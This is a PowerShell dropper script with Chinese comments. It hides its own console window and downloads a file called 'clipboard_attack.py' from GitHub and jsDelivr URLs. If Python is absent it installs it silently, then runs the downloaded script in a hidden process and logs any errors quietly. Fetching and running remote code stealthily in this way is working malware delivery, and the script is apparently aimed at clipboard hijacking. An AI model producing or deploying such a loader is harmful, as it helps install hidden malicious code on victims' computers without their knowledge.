# 强制使用隐藏窗口模式（通过COM对象）
$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
[System.Windows.Forms.Application]::EnableVisualStyles()

# 隐藏主窗口代码（需要保存为ANSI编码）
$signature = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@

$type = Add-Type -MemberDefinition $signature -Name WindowAPI -PassThru
$hwnd = $type::GetConsoleWindow()
$type::ShowWindow($hwnd, 0) | Out-Null

# 设置临时目录
$tempDir = $env:TEMP
$scriptName = "clipboard_attack.py"
$scriptPath = Join-Path $tempDir $scriptName

# 配置下载源（替换为你的真实URL）
$downloadUrls = @(
    "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/main/$scriptName",
    "https://cdn.jsdelivr.net/gh/ethxiaoli/clipboard-setup/$scriptName"
)

# 自动选择最佳下载方式
function Download-File {
    param($url, $path)
    try {
        (New-Object Net.WebClient).DownloadFile($url, $path)
        return $true
    }
    catch {
        try {
            Start-BitsTransfer -Source $url -Destination $path -ErrorAction Stop
            return $true
        }
        catch {
            return $false
        }
    }
}

# 静默安装Python函数
function Install-PythonSilently {
    $pythonURL = "https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe"
    $installerPath = Join-Path $tempDir "python_installer.exe"
    
    if (Download-File $pythonURL $installerPath) {
        $installArgs = @(
            "/quiet", 
            "InstallAllUsers=0", 
            "PrependPath=1", 
            "Include_test=0", 
            "Include_launcher=0",
            "SimpleInstall=1"
        )
        $process = Start-Process $installerPath -ArgumentList $installArgs -PassThru -Wait
        # 更新环境变量
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + 
                    [System.Environment]::GetEnvironmentVariable("Path", "User")
    }
}

# 主执行流程
try {
    # 下载目标脚本
    $downloadSuccess = $false
    foreach ($url in $downloadUrls) {
        if (Download-File $url $scriptPath) {
            $downloadSuccess = $true
            break
        }
    }

    if (-not $downloadSuccess) {
        throw "所有下载源均不可用"
    }

    # 检测Python环境
    $pythonExe = (Get-Command python -ErrorAction SilentlyContinue).Path
    if (-not $pythonExe) {
        $pythonExe = (Get-Command python3 -ErrorAction SilentlyContinue).Path
    }

    if (-not $pythonExe) {
        Install-PythonSilently
        $pythonExe = (Get-Command python -ErrorAction SilentlyContinue).Path
        if (-not $pythonExe) {
            throw "Python安装失败"
        }
    }

    # 执行Python脚本
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $pythonExe
    $psi.Arguments = "-E `"$scriptPath`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($psi) | Out-Null

    # 清理安装包
    Remove-Item (Join-Path $tempDir "python_installer.exe") -ErrorAction SilentlyContinue
}
catch {
    # 错误处理（静默记录到临时文件）
    $_ | Out-File (Join-Path $tempDir "error.log") -Append
}
